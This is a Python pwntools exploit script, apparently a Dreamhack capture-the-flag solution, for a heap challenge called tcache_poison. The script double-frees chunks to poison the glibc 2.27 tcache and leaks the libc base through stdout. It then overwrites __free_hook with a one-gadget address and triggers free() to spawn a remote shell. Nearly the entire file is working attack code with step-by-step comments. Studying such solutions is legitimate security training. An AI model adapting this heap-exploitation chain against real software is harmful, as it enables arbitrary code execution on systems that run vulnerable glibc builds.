#!/usr/bin/env python3
# Name: tcache_poison.py
from pwn import *

#p = process('./tcache_poison')
p = remote('host3.dreamhack.games', 17655)
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

# Initial tcache[0x40] is empty.
# tcache[0x40]: Empty

# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
alloc(0x30, b'dreamhack')
free()

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A -> ...
edit(b'B'*8 + b'\x00')
free()

# Append address of `stdout` to tcache[0x40]
# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, b'BBBBBBBB')

# tcache[0x40]: _IO_2_1_stdout_ -> ...
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] # least significant byte of _IO_2_1_stdout_
alloc(0x30, _io_2_1_stdout_lsb) # allocated at `stdout`

print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432

slog('libc_base', lb)
slog('free_hook', fh)
slog('one_gadget', og)

# Overwrite the `__free_hook` with the address of one-gadget

# Initial tcache[0x50] is empty.
# tcache[0x50]: Empty

# tcache[0x50]: chunk B
alloc(0x40, b'dreamhack') # chunk B
free()

# tcache[0x50]: chunk B -> chunk B -> ...
edit(b'C'*8 + b'\x00')
free()

# tcache[0x50]: chunk B -> __free_hook
alloc(0x40, p64(fh))

# tcache[0x50]: __free_hook
alloc(0x40, b'D'*8)

# __free_hook = the address of one-gadget
alloc(0x40, p64(og))

# Call `free()` to get shell
free()

p.interactive()